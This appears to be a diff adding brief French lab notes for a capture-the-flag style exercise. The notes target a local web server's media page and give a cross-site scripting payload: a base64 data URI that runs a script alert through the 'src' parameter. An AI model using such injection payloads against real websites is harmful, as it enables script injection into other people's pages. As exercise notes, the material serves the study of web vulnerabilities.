@@ -1,0 +1,8 @@
+https://fr.wikipedia.org/wiki/Cross-site_scripting
+
+page http://192.168.105.128/?page=media&src=nsa
+
+remplacer nsa pour faille XSS 
+
+(?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=)
+=>mod ??
